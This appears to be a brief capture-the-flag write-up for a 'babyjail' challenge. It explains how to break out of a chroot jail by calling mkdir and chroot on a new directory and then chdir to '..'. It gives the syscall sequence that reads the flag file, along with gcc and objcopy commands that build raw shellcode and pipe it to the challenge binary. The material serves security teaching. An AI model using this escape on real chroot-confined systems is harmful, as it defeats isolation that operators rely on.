In this problem, you are allowed to use the following system calls instead of `fchdir`.
1. Allowing syscall: chdir (number 80)
2. Allowing syscall: chroot (number 161)
3. Allowing syscall: mkdir (number 83)

You can get the hint for this problem from the Linux manual page for `chroot`.
The following commands perform `chroot` to another directory, nullifying the previous `chroot`.
After that, you can freely get out of the jail.
```
mkdir foo; chroot foo; cd ..
```

Use the following code to solve this problem.
```
mkdir("/foo", 0776);
chroot("/foo");
chdir("../../");
open("./flag", O_RDONLY);
sendfile(1, 4, 0, 0x80);
```

Running the following commands will lead you to the flag.
```
gcc -nostdlib -static shellcode.s -o shellcode-elf​
objcopy --dump-section .text=shellcode-raw shellcode-elf​
/babyjail_level6_teaching1 / < ~/shellcode-raw
```